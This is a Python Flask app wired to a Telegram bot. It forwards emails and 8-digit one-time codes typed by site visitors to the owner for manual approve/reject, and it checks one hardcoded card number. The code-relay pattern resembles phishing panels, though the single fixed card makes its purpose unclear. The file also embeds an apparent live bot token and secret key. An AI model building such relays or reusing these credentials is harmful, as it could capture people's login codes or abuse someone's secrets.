from flask import Flask, render_template, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
import os

app = Flask(__name__)
app.secret_key = 'mrx_super_secret_key'

# ==================== BOT TOKEN (MRXDUDEBOT) ====================
BOT_TOKEN = "8817732687:AAEeZjn96bpKOfvg_51VRzzxG461N0DqWUo"
OWNER_ID = 8011932528
bot = telebot.TeleBot(BOT_TOKEN)

pending_emails = {}
pending_otps = {}
web_status = True

# ==================== WEBSITE OFF/ON CHECK ====================
@app.before_request
def check_status():
    if not web_status and request.endpoint != 'static' and request.path != '/get_status':
        return "🚫 Server is currently offline. Please try again later.", 503

# ==================== BOT HANDLERS ====================

@bot.callback_query_handler(func=lambda call: call.data.startswith('email_'))
def handle_email(call):
    data = call.data.split('_')
    email = data[1]
    action = data[2]
    if action == 'approve':
        bot.answer_callback_query(call.id, "✅ Email Approved")
        pending_emails[email] = 'approved'
        bot.send_message(OWNER_ID, f"✅ Email {email} approved")
    else:
        bot.answer_callback_query(call.id, "❌ Email Rejected")
        pending_emails[email] = 'rejected'
        bot.send_message(OWNER_ID, f"❌ Email {email} rejected")

@bot.callback_query_handler(func=lambda call: call.data.startswith('otp_'))
def handle_otp(call):
    data = call.data.split('_')
    otp = data[1]
    action = data[2]
    if action == 'approve':
        bot.answer_callback_query(call.id, "✅ OTP Approved")
        pending_otps[otp] = 'approved'
        bot.send_message(OWNER_ID, f"✅ OTP {otp} approved")
    else:
        bot.answer_callback_query(call.id, "❌ OTP Rejected")
        pending_otps[otp] = 'rejected'
        bot.send_message(OWNER_ID, f"❌ OTP {otp} rejected")

@bot.message_handler(commands=['sleep'])
def sleep_cmd(msg):
    if msg.from_user.id == OWNER_ID:
        global web_status
        web_status = False
        bot.reply_to(msg, "💤 Web server is now OFFLINE.")
    else:
        bot.reply_to(msg, "❌ Unauthorized")

@bot.message_handler(commands=['wake'])
def wake_cmd(msg):
    if msg.from_user.id == OWNER_ID:
        global web_status
        web_status = True
        bot.reply_to(msg, "🌐 Web server is now ONLINE.")
    else:
        bot.reply_to(msg, "❌ Unauthorized")

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    if msg.from_user.id == OWNER_ID:
        status = "🟢 Online" if web_status else "🔴 Offline"
        bot.reply_to(msg, f"Server status: {status}")
    else:
        bot.reply_to(msg, "❌ Unauthorized")

def send_approval_request(chat_id, email):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Approve", callback_data=f"email_{email}_approve"),
        InlineKeyboardButton("❌ Reject", callback_data=f"email_{email}_reject")
    )
    bot.send_message(chat_id, f"📩 New Email: {email}", reply_markup=markup)

def send_otp_request(chat_id, otp):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Approve", callback_data=f"otp_{otp}_approve"),
        InlineKeyboardButton("❌ Reject", callback_data=f"otp_{otp}_reject")
    )
    bot.send_message(chat_id, f"🔑 New OTP: {otp}", reply_markup=markup)

def start_bot():
    bot.polling(none_stop=True)

threading.Thread(target=start_bot, daemon=True).start()

# ==================== ROUTES ====================

@app.route('/')
def page1():
    return render_template('page1.html')

@app.route('/page2')
def page2():
    return render_template('page2.html')

@app.route('/page3')
def page3():
    return render_template('page3.html')

@app.route('/page4')
def page4():
    return render_template('page4.html')

@app.route('/page5')
def page5():
    return render_template('page5.html')

@app.route('/page6')
def page6():
    return render_template('page6.html')

@app.route('/page7')
def page7():
    return render_template('page7.html')

@app.route('/page8')
def page8():
    return render_template('page8.html')

@app.route('/page9')
def page9():
    return render_template('page9.html')

# ==================== VERIFY CARD ====================
@app.route('/verify_card', methods=['POST'])
def verify_card():
    data = request.json
    card = data.get('card')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    name = data.get('name')
    if card == "7653 0584 4340 2005" and expiry == "20/05" and cvv == "404" and name.upper() == "MRX BUDDY":
        return jsonify({'success': True})
    return jsonify({'success': False})

# ==================== EMAIL & OTP ROUTES ====================

@app.route('/submit_email', methods=['POST'])
def submit_email():
    email = request.json.get('email')
    if email and '@' in email and '.' in email:
        pending_emails[email] = 'pending'
        send_approval_request(OWNER_ID, email)
        return jsonify({'status': 'pending'})
    return jsonify({'status': 'invalid'})

@app.route('/check_email_status', methods=['POST'])
def check_email_status():
    email = request.json.get('email')
    status = pending_emails.get(email, 'pending')
    if status == 'approved':
        pending_emails[email] = 'done'
        return jsonify({'status': 'approved'})
    elif status == 'rejected':
        pending_emails[email] = 'pending'
        return jsonify({'status': 'rejected'})
    return jsonify({'status': 'pending'})

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    otp = request.json.get('otp')
    if otp and len(otp) == 8 and otp.isdigit():
        pending_otps[otp] = 'pending'
        send_otp_request(OWNER_ID, otp)
        return jsonify({'status': 'pending'})
    return jsonify({'status': 'invalid'})

@app.route('/check_otp_status', methods=['POST'])
def check_otp_status():
    otp = request.json.get('otp')
    status = pending_otps.get(otp, 'pending')
    if status == 'approved':
        pending_otps[otp] = 'done'
        return jsonify({'status': 'approved'})
    elif status == 'rejected':
        pending_otps[otp] = 'pending'
        return jsonify({'status': 'rejected'})
    return jsonify({'status': 'pending'})

@app.route('/test')
def test():
    return render_template('test.html')

@app.route('/get_status')
def get_status():
    return jsonify({'status': 'online' if web_status else 'offline'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
